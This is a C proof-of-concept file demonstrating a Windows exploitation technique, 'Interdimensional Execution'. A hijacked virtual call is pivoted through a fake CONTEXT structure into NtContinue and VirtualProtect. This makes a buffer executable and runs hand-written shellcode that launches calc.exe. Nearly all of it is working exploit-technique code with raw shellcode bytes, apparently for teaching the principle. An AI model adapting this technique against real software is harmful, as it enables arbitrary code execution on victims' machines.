//
// This code might help you understand the principle of "Interdimensional Execution"
// http://twitter.com/tombkeeper
//

#include <windows.h>

struct _Obj
{
    FARPROC * vt;
    DWORD type;
    DWORD length;
    DWORD * data;
};

void getlen( struct _Obj* obj )
{
    printf( "Item count: %.8x\n", obj->length );
}

void main()
{
    FARPROC funcs[4] = { (FARPROC)getlen, (FARPROC)getlen, (FARPROC)getlen, (FARPROC)getlen };
    DWORD arr[] = { 0x11111111, 0x22222222, 0x33333333 };
    FARPROC pNtContinue;
    FARPROC pVirtualProtect;
    FARPROC pWinExec;
    FARPROC pExitProcess;
    struct _Obj *obj;
    DWORD   * fptable;
    DWORD   * fstack;
    BYTE    * shellcode;
    DWORD   * sctable;
    CONTEXT * c;

    obj = (struct _Obj *)calloc( 0x20000, 1 );
    if( obj == NULL )
    {
        printf( "Can't allocate memory\n" );
        exit(0);
    }

    obj->vt = funcs;
    obj->type = 1;
    obj->length = sizeof(arr)/sizeof(arr[0]);
    obj->data = arr;
    obj->vt[2]( obj );

    pNtContinue = GetProcAddress( GetModuleHandle("ntdll.dll"), "NtContinue" );
    pVirtualProtect = GetProcAddress( GetModuleHandle("kernel32.dll"), "VirtualProtect" );
    fptable   = (DWORD *)( ((DWORD)obj & 0xffffff00) + 0x4003  );
    shellcode = (BYTE  *)( (DWORD)obj                + 0x8000  );
    fstack    = (DWORD *)( (DWORD)obj                + 0x10000 );
    sctable   = (DWORD *)( (DWORD)obj                + 0x14000 );
    // fill _CONTEXT
    fptable[2] = (DWORD)pNtContinue;
    c = (CONTEXT *)obj;
    c->ContextFlags = (DWORD)fptable; // ContextFlags, also a fake pointer table
    c->Eip = (DWORD)pVirtualProtect;
    c->Esp = (DWORD)fstack;
    // prepare stack frame for VirtualProtect
    fstack[0] = (DWORD)shellcode;              // return address
    fstack[1] = (DWORD)shellcode & 0xfffff000; // address
    fstack[2] = 0x4000;                        // size
    fstack[3] = 0x40;                          // PAGE_EXECUTE_READWRITE
    fstack[4] = (DWORD)&(fstack[6]);           // OldProtect
    // prepare the shellcode
    pWinExec = GetProcAddress( GetModuleHandle("kernel32.dll"), "WinExec" );
    pExitProcess = GetProcAddress( GetModuleHandle("kernel32.dll"), "ExitProcess" );
    sctable[0] = (DWORD)pWinExec;
    sctable[1] = (DWORD)pExitProcess;
    sctable[2] = (DWORD)&(sctable[3]);
    strcpy( (char *)&(sctable[3]), "calc.exe" );
    memcpy( shellcode, "\x55\x8B\xEC\x83\xEC\x0C\xBD", 7 );
    *(DWORD *)(shellcode+7) = (DWORD)sctable+0xC;
    memcpy( shellcode+7+4, "\x6A\x01\xFF\x75\xFC\xFF\x55\xF4\x6A\x00\xFF\x55\xF8\xC9\xC3", 15 );
    // trigger
    obj->vt[2]( obj ); 

}
